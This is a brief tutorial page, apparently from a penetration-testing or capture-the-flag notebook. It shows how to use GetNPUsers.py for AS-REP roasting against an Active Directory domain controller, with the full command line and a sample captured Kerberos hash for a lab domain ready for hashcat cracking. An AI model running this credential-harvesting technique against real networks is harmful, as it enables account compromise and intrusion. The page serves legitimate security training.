Using GetNPUsers.py
***********************

Getting user hashes
#####################

Create a user.txt file with the users you found in kerberoast. This command will put the hashes it finds for a user into an output file

.. code-block:: console

   GetNPUsers.py '<domain.name>/' -usersfile <user.txt> -format hashcat -outputfile <output_file.name> -dc-ip <domain.ip.address.rhost>

The output file should look something like this

.. code-block:: console

        $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:e7ce6ce9db714a02de1ad22b4c97482a$b1825b5619c13b9c24a6133f128732a14b6e11458f3ed2fc3ce674d256312284c4dc19c0e631472e9299fc332eff124eca3ff500c73f8c85589a1720ac2101cfc4117f6fdfbf85606db3f422572f652972a8d21de9d3b48c15b867d617b4fc879d7f523ea931fa089a0a8a9b37e08336c7399470aab57b9c34b999b0348f1350dd5ea505d668fcd4773a4d15cfb93793dcbbc5ed3fab333ddcd5025d5a00856df4ab5a689842a1b7be6910687d11c1c08797f188333cfc419327bce3fc809cbe51c585c7bcf6c18d6a8c37286f1c42234a63f7f239fb1a3cd8462bce32d6834d3ed558f877389492303fc6a198b3b7aba9c39d4d5433677b9c3389cae669c78d

